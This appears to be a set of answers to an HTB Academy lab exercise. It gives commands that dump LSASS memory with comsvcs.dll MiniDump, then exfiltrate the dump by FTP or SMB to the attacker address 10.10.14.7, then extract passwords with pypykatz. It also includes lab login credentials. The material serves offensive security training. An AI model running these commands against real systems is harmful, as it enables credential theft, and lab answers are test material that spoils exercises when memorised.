## What is the name of the executable file associated with the Local Security Authority Process?
```
lsass.exe
```


## Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)
```
xfreerdp3 /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.202.149

Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
dir C:\\

sudo python3 -m pyftpdlib --port 21

(New-Object Net.WebClient).UploadFile('ftp://10.10.14.7/lsass.dmp', 'C:\lsass.dmp')


sudo impacket-smbserver share $(pwd) -smb2support
copy C:\lsass.dmp \\10.10.14.7\share\

ls -lh ~/lsass.dmp
pypykatz lsa minidump ~/lsass.dmp | tee lsass.txt

```